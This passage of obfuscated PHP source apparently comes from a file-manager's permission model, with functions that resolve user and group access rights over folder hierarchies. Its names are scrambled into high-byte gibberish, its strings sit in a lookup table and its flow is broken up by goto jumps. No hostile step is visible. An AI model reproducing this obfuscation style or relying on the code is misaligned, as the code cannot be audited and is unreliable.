($aæ½Œ…ºí[$e™•ˆÛïÙ…[401]] > 0) { $Fâ©ğ¼›óİ[] = $F­Š¬‘¸Ş¸ . $e™•ˆÛïÙ…[33]; } } $B”Î¹İŸ¿â = array(); goto DÇÙïÀ©ˆƒ; D†«¤°Ù: foreach ($DÓË½—‰ã as $EÀ»†õ¼§) { if ($EÀ»†õ¼§[$e™•ˆÛïÙ…[400]] == 0 && $EÀ»†õ¼§[$e™•ˆÛïÙ…[1676]] == $e™•ˆÛïÙ…[86]) { $aŠ‰ßÆ»ùƒ[] = $EÀ»†õ¼§[$e™•ˆÛïÙ…[388]]; } } $B†»Îˆ©ƒŒ = $this->userGroupParents($eÃÔÀÒ“Î); $E­Îõ‰Æƒ = array($e™•ˆÛïÙ…[398] => SourceModel::TYPE_USER, $e™•ˆÛïÙ…[478] => $eÃÔÀÒ“Î); goto Dà©öó»‰; CÕÃ×à¿ØŸ: $e™•ˆÛïÙ… =& $_SERVER[ç]; static $C¨Ç‘â¼¹º = array(); $eÃÔÀÒ“Î = $eÃÔÀÒ“Î ? $eÃÔÀÒ“Î : USER_ID; goto aÊ±ó¬‹Ÿ; cÉÇÎÉ‹Ô¯: $DœÛµ“ä› = array($e™•ˆÛïÙ…[1834] => $B”Î¹İŸ¿â, $e™•ˆÛïÙ…[1835] => $C†’¸Õ–¢«); $C¨Ç‘â¼¹º[$eÃÔÀÒ“Î] = $DœÛµ“ä›; return $DœÛµ“ä›; goto fÆÒ„Ä¥¶; A¬ÓòØ¼á: foreach ($f×·‰ßÙ–È as $bÏùƒ´¿Ø®) { $eª²®Ë¶¡¬ = $fìğ ‰òñ“->getInfo($bÏùƒ´¿Ø®); $B”Î¹İŸ¿â[] = $eª²®Ë¶¡¬[$e™•ˆÛïÙ…[84]][$e™•ˆÛïÙ…[390]]; $f‘½çï ƒŠ[$bÏùƒ´¿Ø®] = $eª²®Ë¶¡¬[$e™•ˆÛïÙ…[84]][$e™•ˆÛïÙ…[390]]; $DõÁ¨‘à•[$bÏùƒ´¿Ø®] = $ağ¾Ğ¿²™‘->parentLevelArray($eª²®Ë¶¡¬[$e™•ˆÛïÙ…[481]]); } foreach ($C†’¸Õ–¢« as $C÷âùíÈĞ¬ => $EÑ³Âô‹ °) { $b¡§àÒæ¸¡ = $b‡Èœ“áïá[$C÷âùíÈĞ¬]; if (!$b¡§àÒæ¸¡ || !$f‘½çï ƒŠ[$b¡§àÒæ¸¡]) { continue; } $EÙç¹¦¶ò = array(); foreach ($DõÁ¨‘à•[$b¡§àÒæ¸¡] as $bÏùƒ´¿Ø®) { $EÙç¹¦¶ò[] = $f‘½çï ƒŠ[$bÏùƒ´¿Ø®]; } $C†’¸Õ–¢«[$C÷âùíÈĞ¬] = array_merge($EÙç¹¦¶ò, $EÑ³Âô‹ °); } $B”Î¹İŸ¿â = array_values(array_unique($B”Î¹İŸ¿â)); goto cÉÇÎÉ‹Ô¯; B¨ã•«„Ø: $DõÁ¨‘à• = array(); if ($Fâ©ğ¼›óİ) { $c§Ÿéïì²¼ = $ağ¾Ğ¿²™‘->where(array($e™•ˆÛïÙ…[390] => array($e™•ˆÛïÙ…[405], $Fâ©ğ¼›óİ)))->select(); foreach ($c§Ÿéïì²¼ as $fÜ´™«¬«ù) { $f£ê‰º¹£ = $ağ¾Ğ¿²™‘->parentLevelArray($fÜ´™«¬«ù[$e™•ˆÛïÙ…[481]]); $B”Î¹İŸ¿â = array_merge($B”Î¹İŸ¿â, $f£ê‰º¹£); $f×·‰ßÙ–È[] = $fÜ´™«¬«ù[$e™•ˆÛïÙ…[478]]; $C†’¸Õ–¢«[$fÜ´™«¬«ù[$e™•ˆÛïÙ…[390]]] = $f£ê‰º¹£; $b‡Èœ“áïá[$fÜ´™«¬«ù[$e™•ˆÛïÙ…[390]]] = $fÜ´™«¬«ù[$e™•ˆÛïÙ…[478]]; } } $f×·‰ßÙ–È = array_values(array_unique($f×·‰ßÙ–È)); goto bó²ˆ¿Í¾¢; fŒÊâÑ÷Š¿: $C†’¸Õ–¢« = array(); $b‡Èœ“áïá = array(); $f‘½çï ƒŠ = array(); goto B¨ã•«„Ø; Dà©öó»‰: if ($B†»Îˆ©ƒŒ) { $E­Îõ‰Æƒ = array(array($e™•ˆÛïÙ…[398] => SourceModel::TYPE_USER, $e™•ˆÛïÙ…[478] => $eÃÔÀÒ“Î), array($e™•ˆÛïÙ…[398] => SourceModel::TYPE_GROUP, $e™•ˆÛïÙ…[478] => array($e™•ˆÛïÙ…[405], $B†»Îˆ©ƒŒ)), $e™•ˆÛïÙ…[925] => $e™•ˆÛïÙ…[1742]); } $Cİæ¿˜•Î = $this->field($e™•ˆÛïÙ…[1842])->where($E­Îõ‰Æƒ)->select(); $Fâ©ğ¼›óİ = array(); goto DŒÜ¥Ù¡‡; bó²ˆ¿Í¾¢: $DßˆË¨×† = $f×·‰ßÙ–È; foreach ($DßˆË¨×† as $bÏùƒ´¿Ø®) { $eª²®Ë¶¡¬ = $fìğ ‰òñ“->getInfo($bÏùƒ´¿Ø®); $f£ê‰º¹£ = $ağ¾Ğ¿²™‘->parentLevelArray($eª²®Ë¶¡¬[$e™•ˆÛïÙ…[481]]); $f×·‰ßÙ–È = array_merge($f×·‰ßÙ–È, $f£ê‰º¹£); } $f×·‰ßÙ–È = array_values(array_unique($f×·‰ßÙ–È)); goto A¬ÓòØ¼á; aÊ±ó¬‹Ÿ: if (isset($C¨Ç‘â¼¹º[$eÃÔÀÒ“Î])) { return $C¨Ç‘â¼¹º[$eÃÔÀÒ“Î]; } $DÓË½—‰ã = Model($e™•ˆÛïÙ…[1841])->listData(); $aŠ‰ßÆ»ùƒ = array(); goto D†«¤°Ù; DÇÙïÀ©ˆƒ: $f×·‰ßÙ–È = $B†»Îˆ©ƒŒ; $ağ¾Ğ¿²™‘ = Model($e™•ˆÛïÙ…[1171]); $fìğ ‰òñ“ = Model($e™•ˆÛïÙ…[480]); goto fŒÊâÑ÷Š¿; fÆÒ„Ä¥¶: } private function makeSourceAuth($Cõ™Øš¦ÄÜ, $cóÆå‰Õ„—, $C‹ÎÖî­ï½ = false) { goto bëö ‡“×ø; b¹îÜÃ©â: $f‘¤Š£•¼Ù = $Cõ™Øš¦ÄÜ[$aæöïŞÊšË[398]] == SourceModel::TYPE_GROUP; $BÚÆŒ¬±à = $f‘¤Š£•¼Ù ? $this->groupRootAuth($f†–Êš©, $C‹ÎÖî­ï½) : !1; if ($BÚÆŒ¬±à && Model($aæöïŞÊšË[1822])->authCheckAction($BÚÆŒ¬±à[$aæöïŞÊšË[400]], $aæöïŞÊšË[1674])) { return $this->groupAuthInfo($BÚÆŒ¬±à, $f†–Êš©); } goto AİËî¤ËÜ; e³¿¼™ô›: if (!$bÒÄœ¦âª·) { $B’ÂÍÍ¡èï = Model($aæöïŞÊšË[480])->getInfo($f†–Êš©); $f“‰­Ìë„ = explode($aæöïŞÊšË[47], trim($B’ÂÍÍ¡èï[$aæöïŞÊšË[481]], $aæöïŞÊšË[47])); $f“‰­Ìë„ = array_reverse($f“‰­Ìë„); foreach ($f“‰­Ìë„ as $f ÈîÊåï) { if ($f ÈîÊåï == $aæöïŞÊšË[491] || $f ÈîÊåï == $féÕìŠß„ƒ) { continue; } $aõåÁ‡¤ˆš = $this->groupRootAuth($f ÈîÊåï, $C‹ÎÖî­ï½); if (!$aõåÁ‡¤ˆš) { continue; } $bÒÄœ¦âª· = $this->groupAuthInfo($aõåÁ‡¤ˆš, $f ÈîÊåï); break; } } if (!$bÒÄœ¦âª· || $bÒÄœ¦âª·[$aæöïŞÊšË[401]] <= 0) { $eª“âÒäî† = $this->authDeepCheck($Cõ™Øš¦ÄÜ[$aæöïŞÊšË[390]], $C‹ÎÖî­ï½); if ($eª“âÒäî†) { $bÒÄœ¦âª· = $eª“âÒäî†; } } return $bÒÄœ¦âª·; goto b¥ŠÚ‹Ï¶Æ; AİËî¤ËÜ: $b‘òåî®± = Model($aæöïŞÊšË[1171])->parentLevelArray($Cõ™Øš¦ÄÜ[$aæöïŞÊšË[481]]); $b‘òåî®± = array_merge(array($Cõ™Øš¦ÄÜ[$aæöïŞÊšË[390]]), array_reverse($b‘òåî®±)); $bÒÄœ¦âª· = !1; goto eçŠÌ†îÂ; eçŠÌ†îÂ: foreach ($b‘òåî®± as $c…•Ç÷òëˆ) { if (!isset($cóÆå‰Õ„—[$c…•Ç÷òëˆ])) { continue; } $fÍñ´‘˜áö = $this->authMake($cóÆå‰Õ„—[$c…•Ç÷òëˆ], $C‹ÎÖî­ï½); if ($fÍñ´‘˜áö[$aæöïŞÊšË[440]]) { $bÒÄœ¦âª· = $fÍñ´‘˜áö; break; } } if (!$f‘¤Š£•¼Ù) { return $bÒÄœ¦âª·; } if (!$bÒÄœ¦âª· && $BÚÆŒ¬±à) { $bÒÄœ¦âª· = $this->groupAuthInfo($BÚÆŒ¬±à, $f†–Êš©); } goto e³¿¼™ô›; bëö ‡“×ø: $aæöïŞÊšË =& $_SERVER[ç]; $féÕìŠß„ƒ = $aæöïŞÊšË[86]; $f†–Êš© = $Cõ™Øš¦ÄÜ[$aæöïŞÊšË[478]]; goto b¹îÜÃ©â; b¥ŠÚ‹Ï¶Æ: } private function userIsRoot($bê„©ßÆæò = false) { $B†¹Ñ£ó‰ˆ =& $_SERVER[ç]; if (!$bê„©ßÆæò && _get($GLOBALS, $B†¹Ñ£ó‰ˆ[479])) { return !0; } $CçÓµËÃòí = Model($B†¹Ñ£ó‰ˆ[501])->getInfo($bê„©ßÆæò); $có‚×…ØšŒ = Model($B†¹Ñ£ó‰ˆ[1843])->listData($CçÓµËÃòí[$B†¹Ñ£ó‰ˆ[1375]]); if ($có‚×…ØšŒ && $có‚×…ØšŒ[$B†¹Ñ£ó‰ˆ[1247]][$B†¹Ñ£ó‰ˆ[1844]] == 1) { return !0; } return !1; } private function sourceAuthInfo($CÈÅ÷ª×©‹) { goto C½¥¾†¹ã»; C½¥¾†¹ã»: $D”¿‹Á•§å =& $_SERVER[ç]; $cÜéóçŠå = Model($D”¿‹Á•§å[1171]); $cÇ‡Œ³º”Í = $cÜéóçŠå->sourceInfo($CÈÅ÷ª×©‹); goto E¡†ååƒª ; c„éµ‘—¤™: $A‹õª¢ = $cÜéóçŠå->_listAppendPath($A‹õª¢); $cÇ‡Œ³º”Í = $A‹õª¢[0]; $bŒÊºÀïÉ™ = $cÇ‡Œ³º”Í[$D”¿‹Á•§å[489]]; goto d÷åöŠ¤ô; E¡†ååƒª : if (!$cÇ‡Œ³º”Í) { return !1; } $cÜéóçŠå->groupPathDisplay($cÇ‡Œ³º”Í); $A‹õª¢ = array($cÇ‡Œ³º”Í); goto c„éµ‘—¤™; d÷åöŠ¤ô: if (isset($cÇ‡Œ³º”Í[$D”¿‹Á•§å[486]])) { $F½‰šà–Ş° = explode($D”¿‹Á•§å[8], trim($cÇ‡Œ³º”Í[$D”¿‹Á•§å[489]], $D”¿‹Á•§å[8])); array_shift($F½‰šà–Ş°); $bŒÊºÀïÉ™ = $cÇ‡Œ³º”Í[$D”¿‹Á•§å[484]] . $D”¿‹Á•§å[1845] . implode($D”¿‹Á•§å[8], $F½‰šà–Ş°); } return array($D”¿‹Á•§å[407] => $cÇ‡Œ³º”Í[$D”¿‹Á•§å[28]], $D”¿‹Á•§å[75] => KodIO::make($cÇ‡Œ³º”Í[$D”¿‹Á•§å[390]]), $D”¿‹Á•§å[1846] => $bŒÊºÀïÉ™); goto B‚ôÌğ‹ø; B‚ôÌğ‹ø: } private function groupAuthInfo($e¬ß¡‰‡¸Ì, $f‘…ƒŒœÔ) { $fö¼‡ì†õ =& $_SERVER[ç]; $B»§¢Çä‘Æ = Model($fö¼‡ì†õ[480])->getInfo($f‘…ƒŒœÔ); return array($fö¼‡ì†õ[1847] => intval($e¬ß¡‰‡¸Ì[$fö¼‡ì†õ[400]]), $fö¼‡ì†õ[1831] => $e¬ß¡‰‡¸Ì, $fö¼‡ì†õ[1848] => LNG($fö¼‡ì†õ[1849]), $fö¼‡ì†õ[1840] => array($fö¼‡ì†õ[407] => $B»§¢Çä‘Æ[$fö¼‡ì†õ[28]], $fö¼‡ì†õ[75] => KodIO::make($B»§¢Çä‘Æ[$fö¼‡ì†õ[84]][$fö¼‡ì†õ[390]]), $fö¼‡ì†õ[1846] => $B»§¢Çä‘Æ[$fö¼‡ì†õ[485]])); } protected function groupRootAuth($aô•ôù™¦, $e†íƒÔÖÓ = false) { goto C–Ïôˆˆ; dïöË‚Œ¬…: $cŸ½òÂĞ§Ë[$eÓ¸ŒÑ¢·Ã] = $Fà†÷íÇ‘œ ? $Fà†÷íÇ‘œ : $aôëÇ¼ºî; return $cŸ½òÂĞ§Ë[$eÓ¸ŒÑ¢·Ã]; goto Fñ·„·Ïñ‰; e–»Ø¿Ñ©: $b×´ğÚ—¡ƒ = $this->userGroupList($e†íƒÔÖÓ); $aôëÇ¼ºî = isset($b×´ğÚ—¡ƒ[$aô•ôù™¦]) ? $b×´ğÚ—¡ƒ[$aô•ôù™¦][$eÆ—áî¶°â[400]] : !1; if ($aôëÇ¼ºî && Model($eÆ—áî¶°â[1822])->authCheckAction($aôëÇ¼ºî[$eÆ—áî¶°â[400]], $eÆ—áî¶°â[1674])) { $cŸ½òÂĞ§Ë[$eÓ¸ŒÑ¢·Ã] = $aôëÇ¼ºî; return $aôëÇ¼ºî; } goto Dšè‹™ƒ®¹; C–Ïôˆˆ: $eÆ—áî¶°â =& $_SERVER[ç]; $e†íƒÔÖÓ = $e†íƒÔÖÓ ? $e†íƒÔÖÓ : USER_ID; $eÓ¸ŒÑ¢·Ã = $e†íƒÔÖÓ . $eÆ—áî¶°â[1850] . $aô•ôù™¦; goto Eˆ‹×º¦¹; Eˆ‹×º¦¹: static $cŸ½òÂĞ§Ë = array(); if (isset($cŸ½òÂĞ§Ë[$eÓ¸ŒÑ¢·Ã])) { return $cŸ½òÂĞ§Ë[$eÓ¸ŒÑ¢·Ã]; } $aì«¨å•Ìğ = Model($eÆ—áî¶°â[480])->getInfo($aô•ôù™¦); goto e–»Ø¿Ñ©; Dšè‹™ƒ®¹: $bŒ½Á‘¿Í = $this->sourceAuthSelect($aì«¨å•Ìğ[$eÆ—áî¶°â[84]][$eÆ—áî¶°â[390]]); $C®«õšµ… = $bŒ½Á‘¿Í ? $this->authMake($bŒ½Á‘¿Í, $e†íƒÔÖÓ) : !1; $Fà†÷íÇ‘œ = $C®«õšµ… ? $C®«õšµ…[$eÆ—áî¶°â[440]] : !1; goto dïöË‚Œ¬…; Fñ·„·Ïñ‰: } public function authOwnerApply($C®•µ¿œ‹ï) { goto eĞ½Š÷ˆëÌ; A³·¶óšñÇ: $C®•µ¿œ‹ï[$aèŞÂá¡ì[400]][$aèŞÂá¡ì[1853]] = Model($aèŞÂá¡ì[497])->userListInfo($AŒ­õÙ„Ëá); return $C®•µ¿œ‹ï; goto F÷Ïáİ†½„; b’ˆó„ßŒ†: if (count($AŒ­õÙ„Ëá) == 0) { $AŒ­õÙ„Ëá = $this->authFolderOwnerGroup($C®•µ¿œ‹ï[$aèŞÂá¡ì[478]]); } $AŒ­õÙ„Ëá = array_unique($AŒ­õÙ„Ëá); if (AuthModel::authCheckRoot($C®•µ¿œ‹ï[$aèŞÂá¡ì[400]][$aèŞÂá¡ì[401]])) { $AŒ­õÙ„Ëá[] = USER_ID; } goto A³·¶óšñÇ; eĞ½Š÷ˆëÌ: $aèŞÂá¡ì =& $_SERVER[ç]; if (empty($C®•µ¿œ‹ï[$aèŞÂá¡ì[400]]) || isset($C®•µ¿œ‹ï[$aèŞÂá¡ì[1851]]) && $C®•µ¿œ‹ï[$aèŞÂá¡ì[1851]]) { return $C®•µ¿œ‹ï; } if (AuthModel::authCheckRoot($C®•µ¿œ‹ï[$aèŞÂá¡ì[400]][$aèŞÂá¡ì[401]])) { return $C®•µ¿œ‹ï; } goto FèãÇÈó¿ô; FèãÇÈó¿ô: $A©ƒªÛîÍï = Model($aèŞÂá¡ì[1171])->parentLevelArray($C®•µ¿œ‹ï[$aèŞÂá¡ì[481]]); $A©ƒªÛîÍï = array_merge(array($C®•µ¿œ‹ï[$aèŞÂá¡ì[390]]), array_reverse($A©ƒªÛîÍï)); $A½¹…íÊ = $this->sourceAuthSelect($A©ƒªÛîÍï); goto a¬ÓÙåÙÇ; a¬ÓÙåÙÇ: $fÁÄÁ§îõÛ = array(); $AŒ­õÙ„Ëá = array(); foreach ($A½¹…íÊ as $E®¹¥°§Ğ => $f‚á½ôÈ) { $B½¾Ñİé = $this->authFolderOwnerUser($f‚á½ôÈ); $fÁÄÁ§îõÛ[$E®¹¥°§Ğ] = $B½¾Ñİé; $AŒ­õÙ„Ëá = array_merge($AŒ­õÙ„Ëá, $B½¾Ñİé[$aèŞÂá¡ì[557]]); if ($B½¾Ñİé[$aèŞÂá¡ì[1852]]) { break; } } goto b’ˆó„ßŒ†; F÷Ïáİ†½„: } private function authFolderOwnerGroup($a¨Âµğ‚Ä) { $CÊ—ÜÔíà¶ =& $_SERVER[ç]; $e™¿®¥ó  = Model($CÊ—ÜÔíà¶[1736])->where(array($CÊ—ÜÔíà¶[1654] => $a¨Âµğ‚Ä))->select(); $FìŠ„ÆÊÅƒ = array(); if (!$e™¿®¥ó ) { return $FìŠ„ÆÊÅƒ; } foreach ($e™¿®¥ó  as $aç—İÇÎ„Ç) { $F»ê–×ÙËÓ = $this->authInfo($aç—İÇÎ„Ç); if (AuthModel::authCheckRoot($F»ê–×ÙËÓ[$CÊ—ÜÔíà¶[400]])) { $FìŠ„ÆÊÅƒ[] = $aç—İÇÎ„Ç[$CÊ—ÜÔíà¶[1491]]; } } return $FìŠ„ÆÊÅƒ; } private function authFolderOwnerUser($fìÓ‡¤ÇÓÆ) { $f½«ßÃ¬»¿ =& $_SERVER[ç]; $CÊÙ„ñ¸æ = array(); $d½ŸÁ¢àİ = !1; foreach ($fìÓ‡¤ÇÓÆ as $B‰±Ë³ôé) { $Aö¼Ò£‘Ó = $this->authInfo($B‰±Ë³ôé); if ($B‰±Ë³ôé[$f½«ßÃ¬»¿[478]] == $f½«ßÃ¬»¿[491]) { $d½ŸÁ¢àİ = !0; } if ($B‰±Ë³ôé[$f½«ßÃ¬»¿[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Aö¼Ò£‘Ó[$f½«ßÃ¬»¿[400]])) { $CÊÙ„ñ¸æ[] = $B‰±Ë³ôé[$f½«ßÃ¬»¿[478]]; } } } return array($f½«ßÃ¬»¿[557] => $CÊÙ„ñ¸æ, $f½«ßÃ¬»¿[1852] => $d½ŸÁ¢àİ); } public function authMake($Eº¥‰«Ã©”, $CêŞÅŠ”á£ = false) { $aØ›ˆô–×ğ =& $_SERVER[ç]; $E½í¡‹†Ø = $this->authArrayCheck($Eº¥‰«Ã©”, $CêŞÅŠ”á£); if ($E½í¡‹†Ø[$aØ›ˆô–×ğ[1854]]) { $E½í¡‹†Ø[$aØ›ˆô–×ğ[1854]] = $this->sourceAuthInfo($E½í¡‹†Ø[$aØ›ˆô–×ğ[1854]]); } return $E½í¡‹†Ø; } public function authArrayCheck($bõñß²äÍ´, $f„±ˆô›„ë = false) { goto Bë¸œ•‰ğ; fé‰®‹²ß: $dáèóé•÷Ë = 0; $fåŠ¡áÏË“ = 0; $FÓåç¶¿Ëæ = 0; goto d¢ğÄç¢¨–; Bë¸œ•‰ğ: $EÚ±¯ÂƒáÃ =& $_SERVER[ç]; if (!$bõñß²äÍ´) { return array($EÚ±¯ÂƒáÃ[401] => 0, $EÚ±¯ÂƒáÃ[440] => !1); } $f„±ˆô›„ë = $f„±ˆô›„ë ? $f„±ˆô›„ë : USER_ID; goto fé‰®‹²ß; C‰º‘·Í›å: $cÖö†×Éğµ = 1000; $c‚Òî‹—³Õ = 0; $C°Ò•¢™ëñ = 0; goto b ¸‰œòä¹; fÈ¦³Ôáœ§: return $D—×ØÎ´÷; goto fÈ¶ø˜²«»; a–˜±ñ×õ¦: foreach ($bõñß²äÍ´ as $EÜÕƒé ÷‰) { $AÑÃŞìÒ›· = $this->authInfo($EÜÕƒé ÷‰); if (!$AÑÃŞìÒ›·) { continue; } $BŞòí¿®¦¨ = $EÜÕƒé ÷‰[$EÚ±¯ÂƒáÃ[478]]; $E¦æããöÄæ = intval($AÑÃŞìÒ›·[$EÚ±¯ÂƒáÃ[400]]); if ($EÜÕƒé ÷‰[$EÚ±¯ÂƒáÃ[398]] == SourceModel::TYPE_USER && $BŞòí¿®¦¨ == $f„±ˆô›„ë) { $dáèóé•÷Ë = !0; $FÓåç¶¿Ëæ = $AÑÃŞìÒ›·; $fåŠ¡áÏË“ = $E¦æããöÄæ; } else { if ($EÜÕƒé ÷‰[$EÚ±¯ÂƒáÃ[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($BŞòí¿®¦¨, $f„±ˆô›„ë)) { $e‚øÅ‹«ñ = !0; $fÊïÖŠ Ñâ = $this->groupStepToUserGroup($BŞòí¿®¦¨, $f„±ˆô›„ë); if ($fÊïÖŠ Ñâ < $cÖö†×Éğµ) { $cÖö†×Éğµ = $fÊïÖŠ Ñâ; $f¡ˆÈ»Üè = $E¦æããöÄæ; $D¸‰ÜÁ‹‚¶ = $AÑÃŞìÒ›·; $c‚Òî‹—³Õ = $BŞòí¿®¦¨; } if ($fÊïÖŠ Ñâ == $cÖö†×Éğµ && $E¦æããöÄæ >= $f¡ˆÈ»Üè) { $f¡ˆÈ»Üè = $E¦æããöÄæ; $D¸‰ÜÁ‹‚¶ = $AÑÃŞìÒ›·; $c‚Òî‹—³Õ = $BŞòí¿®¦¨; } } else { if ($BŞòí¿®¦¨ == $EÚ±¯ÂƒáÃ[491]) { $C°Ò•¢™ëñ = !0; $c‰ç·‡™‰ = $AÑÃŞìÒ›·; $A˜Í¨¾ä° = $E¦æããöÄæ; } } } } if ($dáèóé•÷Ë) { $eóÁÌ„¨‹ = $fåŠ¡áÏË“; $AÑÃŞìÒ›· = $FÓåç¶¿Ëæ; $fØÒ—Ğ¤ = LNG($EÚ±¯ÂƒáÃ[1855]); } else { if ($e‚øÅ‹«ñ) { $eóÁÌ„¨‹ = $f¡ˆÈ»Üè; $AÑÃŞìÒ›· = $D¸‰ÜÁ‹‚¶; $e¨ËÆÇ˜ÙÙ = Model($EÚ±¯ÂƒáÃ[480])->getInfo($c‚Òî‹—³Õ); $fØÒ—Ğ¤ = $EÚ±¯ÂƒáÃ[159] . $e¨ËÆÇ˜ÙÙ[$EÚ±¯ÂƒáÃ[485]] . $EÚ±¯ÂƒáÃ[1856] . LNG($EÚ±¯ÂƒáÃ[1857]); } else { if ($C°Ò•¢™ëñ) { $eóÁÌ„¨‹ = $A˜Í¨¾ä°; $AÑÃŞìÒ›· = $c‰ç·‡™‰; $fØÒ—Ğ¤ = LNG($EÚ±¯ÂƒáÃ[1828]); } else { $eóÁÌ„¨‹ = 0; $AÑÃŞìÒ›· = !1; $fØÒ—Ğ¤ = $EÚ±¯ÂƒáÃ[33]; } } } $D—×ØÎ´÷ = array($EÚ±¯ÂƒáÃ[1847] => intval($eóÁÌ„¨‹), $EÚ±¯ÂƒáÃ[1831] => $AÑÃŞìÒ›·, $EÚ±¯ÂƒáÃ[1848] => $fØÒ—Ğ¤, $EÚ±¯ÂƒáÃ[1840] => $EÜÕƒé ÷‰[$EÚ±¯ÂƒáÃ[390]]); goto fÈ¦³Ôáœ§; d¢ğÄç¢¨–: $e‚øÅ‹«ñ = 0; $f¡ˆÈ»Üè = 0; $D¸‰ÜÁ‹‚¶ = 0; goto C‰º‘·Í›å; b ¸‰œòä¹: $A˜Í¨¾ä° = 0; $c‰ç·‡™‰ = 0; $EÜÕƒé ÷‰ = array($EÚ±¯ÂƒáÃ[390] => 0); goto a–˜±ñ×õ¦; fÈ¶ø˜²«»: } private function groupContainUser($CÂãºÁ½±, $DÊŞ«¬ï©£ = false) { return in_array($CÂãºÁ½±, $this->userGroupParents($DÊŞ«¬ï©£)); } private function groupStepToUserGroup($b–¯ë—À—Í, $d‹†âÕ‘“¸ = false) { goto D¼“íç°ö“; fÑ³ô—¬£: $déŠÃƒË¥â = $GLOBALS[$e›ğ¾ïÛ–Ö[6]][$e›ğ¾ïÛ–Ö[87]][$e›ğ¾ïÛ–Ö[1747]] == 1; $f‰ë‹¢Ş§‰ = $déŠÃƒË¥â ? 3 : 2; foreach ($f…ÜƒŠ½˜Ş as $c«»Ÿå›šŸ) { if ($c«»Ÿå›šŸ[$e›ğ¾ïÛ–Ö[1654]] == $b–¯ë—À—Í) { return 0; } $cÅËË×Æì† = explode($e›ğ¾ïÛ–Ö[47], trim($c«»Ÿå›šŸ[$e›ğ¾ïÛ–Ö[481]], $e›ğ¾ïÛ–Ö[47])); if ($cÅËË×Æì†[0] == $e›ğ¾ïÛ–Ö[491] && count($cÅËË×Æì†) > $f‰ë‹¢Ş§‰) { $Fš¸°ŸŠ©È = array_reverse(array_slice($cÅËË×Æì†, $f‰ë‹¢Ş§‰)); $aò–”¥÷²É = array_search($b–¯ë—À—Í, $Fš¸°ŸŠ©È); if ($aò–”¥÷²É !== !1 && $aò–”¥÷²É + 1 <= $fì—ìùê·´) { $fì—ìùê·´ = $aò–”¥÷²É + 1; } } } goto e¯¯÷—Ì•; e¯¯÷—Ì•: return $fì—ìùê·´; goto bùëöîŒ¢«; D¼“íç°ö“: $e›ğ¾ïÛ–Ö =& $_SERVER[ç]; $f…ÜƒŠ½˜Ş = $this->userGroupList($d‹†âÕ‘“¸); $fì—ìùê·´ = 1000; goto fÑ³ô—¬£; bùëöîŒ¢«: } private function userGroupList($cˆ†£âù– = false) { $f‘‚‚£âã =& $_SERVER[ç]; static $Eâ–³õŞ³ = array(); if (isset($Eâ–³õŞ³[$cˆ†£âù–])) { return $Eâ–³õŞ³[$cˆ†£âù–]; } $Cä¬Šå†âÔ = Model($f‘‚‚£âã[501])->getInfo($cˆ†£âù–); $Eâ–³õŞ³[$cˆ†£âù–] = array_to_keyvalue($Cä¬Šå†âÔ[$f‘‚‚£âã[1829]], $f‘‚‚£âã[1654]); return $Eâ–³õŞ³[$cˆ†£âù–]; } public function userGroupParents($a£‹–´š°…) { goto E¤ãº­¥¸; A•ªË‘¯¶†: $fÛ¼ãõ‡‚ = $GLOBALS[$B—óÃ²á³[6]][$B—óÃ²á³[87]][$B—óÃ²á³[1747]] == 1; $FæíÅƒñ¹Ù = $fÛ¼ãõ‡‚ ? 3 : 2; foreach ($a„Ã‰‹«ªÎ as $fÅÜÄàÓ) { $e™‘¶—”Ê = array($fÅÜÄàÓ[$B—óÃ²á³[1654]]); $f»¸×ˆ„ó³ = explode($B—óÃ²á³[47], trim($fÅÜÄàÓ[$B—óÃ²á³[481]], $B—óÃ²á³[47])); if ($f»¸×ˆ„ó³[0] == $B—óÃ²á³[491] && count($f»¸×ˆ„ó³) > $FæíÅƒñ¹Ù) { $dâ¼­è·º© = array_slice($f»¸×ˆ„ó³, $FæíÅƒñ¹Ù); $e™‘¶—”Ê = array_merge($e™‘¶—”Ê, array_reverse($dâ¼­è·º©)); } $cÇÎß‡å‚ = array_merge($cÇÎß‡å‚, $e™‘¶—”Ê); } goto FĞ³ë›ˆÆ; aÙŒïã£àŸ: if (isset($f¼È£©Æ[$a£‹–´š°…])) { return $f¼È£©Æ[$a£‹–´š°…]; } $a„Ã‰‹«ªÎ = $this->userGroupList($a£‹–´š°…); $cÇÎß‡å‚ = array(); goto A•ªË‘¯¶†; FĞ³ë›ˆÆ: $f¼È£©Æ[$a£‹–´š°…] = array_unique($cÇÎß‡å‚); return $f¼È£©Æ[$a£‹–´š°…]; goto b°ùå¾†İÀ; E¤ãº­¥¸: $B—óÃ²á³ =& $_SERVER[ç]; static $f¼È£©Æ = array(); $a£‹–´š°… = $a£‹–´š°… ? $a£‹–´š°… : USER_ID; goto aÙŒïã£àŸ; b°ùå¾†İÀ: } public function authTargetInfoMake($eÏ½¹÷‰óÕ) { goto Dºœ²ĞÊ×ğ; F‘ÀÖğÕ§Ü: return array($f‰‹¸¸±ùµ[1859] => $C¯©£½Ìóã, $f‰‹¸¸±ùµ[1860] => $C‹‰Ò“É©); goto Cõ§Éê¤; Dºœ²ĞÊ×ğ: $f‰‹¸¸±ùµ =& $_SERVER[ç]; $C¯©£½Ìóã = array(); $C‹‰Ò“É© = array(); goto bî†Ø”Õ‡; bî†Ø”Õ‡: foreach ($eÏ½¹÷‰óÕ as $fŸĞ®´ˆ·‰) { if ($fŸĞ®´ˆ·‰[$f‰‹¸¸±ùµ[398]] == SourceModel::TYPE_USER) { $C¯©£½Ìóã[] = intval($fŸĞ®´ˆ·‰[$f‰‹¸¸±ùµ[478]]); } else { if ($fŸĞ®´ˆ·‰[$f‰‹¸¸±ùµ[398]] == SourceModel::TYPE_GROUP) { $C‹‰Ò“É©[] = intval($fŸĞ®´ˆ·‰[$f‰‹¸¸±ùµ[478]]); } } } if ($C¯©£½Ìóã) { $C¯©£½Ìóã = Model($f‰‹¸¸±ùµ[497])->userListInfo($C¯©£½Ìóã); } if ($C‹‰Ò“É©) { $FÅÛÖ«Ì„£ = array($f‰‹¸¸±ùµ[1733] => array($f‰‹¸¸±ùµ[405], $C‹‰Ò“É©)); $C‹‰Ò“É© = Model($f‰‹¸¸±ùµ[480])->field($f‰‹¸¸±ùµ[1858])->where($FÅÛÖ«Ì„£)->select(); $C‹‰Ò“É© = array_to_keyvalue($C‹‰Ò“É©, $f‰‹¸¸±ùµ[1654]); } goto F‘ÀÖğÕ§Ü; Cõ§Éê¤: } public function authInfo($b²´áÔ¹éÅ) { $aŒÈ„•ãåÓ =& $_SERVER[ç]; if 